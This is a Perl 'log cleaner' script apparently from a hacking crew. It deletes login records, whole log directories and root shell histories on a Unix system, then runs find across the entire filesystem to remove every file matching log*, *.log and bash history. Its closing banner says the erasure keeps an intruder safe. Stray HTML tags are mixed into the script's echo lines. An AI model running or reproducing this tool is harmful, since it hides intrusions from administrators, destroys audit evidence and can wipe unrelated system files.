#/!usr/bin/perl 
use strict;
print q{ 
----------------[LOG CLEANER]-----------------
[@]---------[We Are Team of Cyber]==--------[@]
[@]-----------[ReCoded By N4ck0 ]-----------[@]
[@]---------[We Are not a Hacker]-----------[@]
[@]------------===============--------------[@]
----------------------------------------------- 
My Home <a href="../">http://explorecrew.org</a>
    IRC[dot]BYROE[dot]NET
    contact me 
   n4ck0[at]explorecrew[dot]org
}; 
system "echo -e \"\033[01;34m---------[ All Report of LogFile ]---------\033[01;37m\"\n";
if( -e "/var/log/lastlog" )
 {
   system 'rm -rf /var/log/lastlog';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/log/lastlog">\\033[01;37m[*]/var/log/lastlog</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/log/lastlog">\\033[01;31m[*]/var/log/lastlog</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/log/wtmp" )
 {
   system 'rm -rf /var/log/wtmp';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/log/wtmp">\\033[01;37m[*]/var/log/wtmp</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/log/wtmp">\\033[01;31m[*]/var/log/wtmp</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/etc/wtmp" )
 {
   system 'rm -rf /etc/wtmp';
   system "echo -e \"<a href="file://\\033[01;37m[*]/etc/wtmp">\\033[01;37m[*]/etc/wtmp</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/etc/wtmp">\\033[01;31m[*]/etc/wtmp</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/run/utmp" )
 {
   system 'rm -rf /var/run/utmp';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/run/utmp">\\033[01;37m[*]/var/run/utmp</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/run/utmp">\\033[01;31m[*]/var/run/utmp</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/etc/utmp" )
 {
   system 'rm -rf /etc/utmp';
   system "echo -e \"<a href="file://\\033[01;37m[*]/etc/utmp">\\033[01;37m[*]/etc/utmp</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/etc/utmp">\\033[01;31m[*]/etc/utmp</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/log" )
 {
   system 'rm -rf /var/log';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/log">\\033[01;37m[*]/var/log</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/log">\\033[01;31m[*]/var/log</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/logs" )
 {
   system 'rm -rf /var/logs';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/logs">\\033[01;37m[*]/var/logs</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/logs">\\033[01;31m[*]/var/logs</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/adm" )
 {
   system 'rm -rf /var/adm';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/adm">\\033[01;37m[*]/var/adm</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/adm">\\033[01;31m[*]/var/adm</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/apache/log" )
 {
   system 'rm -rf /var/apache/log';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/apache/log">\\033[01;37m[*]/var/apache/log</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/apache/log">\\033[01;31m[*]/var/apache/log</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/var/apache/logs" )
 {
   system 'rm -rf /var/apache/logs';
   system "echo -e \"<a href="file://\\033[01;37m[*]/var/apache/logs">\\033[01;37m[*]/var/apache/logs</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/var/apache/logs">\\033[01;31m[*]/var/apache/logs</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/usr/local/apache/log" )
 {
   system 'rm -rf /usr/local/apache/log';
   system "echo -e \"<a href="file://\\033[01;37m[*]/usr/local/apache/log">\\033[01;37m[*]/usr/local/apache/log</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/usr/local/apache/log">\\033[01;31m[*]/usr/local/apache/log</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/usr/local/apache/logs" )
 {
   system 'rm -rf /usr/local/apache/logs';
   system "echo -e \"<a href="file://\\033[01;37m[*]/usr/local/apache/logs">\\033[01;37m[*]/usr/local/apache/logs</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/usr/local/apache/logs">\\033[01;31m[*]/usr/local/apache/logs</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/root/.bash_history" )
 {
   system 'rm -rf /root/.bash_history';
   system "echo -e \"<a href="file://\\033[01;37m[*]/root/.bash_history">\\033[01;37m[*]/root/.bash_history</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/root/.bash_history">\\033[01;31m[*]/root/.bash_history</a> - No such file or directory\\033[01;37m\"\n";
 }
if( -e "/root/.ksh_history" )
 {
   system 'rm -rf /root/.ksh_history';
   system "echo -e \"<a href="file://\\033[01;37m[*]/root/.ksh_history">\\033[01;37m[*]/root/.ksh_history</a> -erased Ok\"\n";
 }
else
 {
  system "echo -e \"<a href="file://\\033[01;31m[*]/root/.ksh_history">\\033[01;31m[*]/root/.ksh_history</a> - No such file or directory\\033[01;37m\"\n";
 }
system "echo -e \"<a href="file://\\033[01;37m">\\033[01;37m</a>[+] -----done all default log and bash_history files erased !!\"\n";
system "echo -e \"\033[01;34m---------Now Erasing the rest of the machine log files (can be long :S)---------\033[01;37m\"\n";
 system 'find / -name *.bash_history -exec rm -rf {} \;';
system "echo -e \"<a href="file://\\033[01;37m">\\033[01;37m</a>[*] all *.bash_history files -erased Ok!\"\n";
 system 'find / -name *.bash_logout -exec rm -rf {} \;';
system "echo -e \"<a href="file://\\033[01;37m">\\033[01;37m</a>[*] all *.bash_logout files -erased Ok!\"\n";
 system 'find / -name log* -exec rm -rf {} \;';
system "echo -e \"<a href="file://\\033[01;37m">\\033[01;37m</a>[*] all log* files -erased Ok!\"\n";
 system 'find / -name *.log -exec rm -rf {} \;';
system "echo -e \"<a href="file://\\033[01;37m">\\033[01;37m</a>[*] all *.log files -erased Ok!\"\n";
system "echo -e \"\033[01;34m-------[+] Akhirnya Semua Log File Terhapus, aman [+]-------\033[01;37m\"\n";
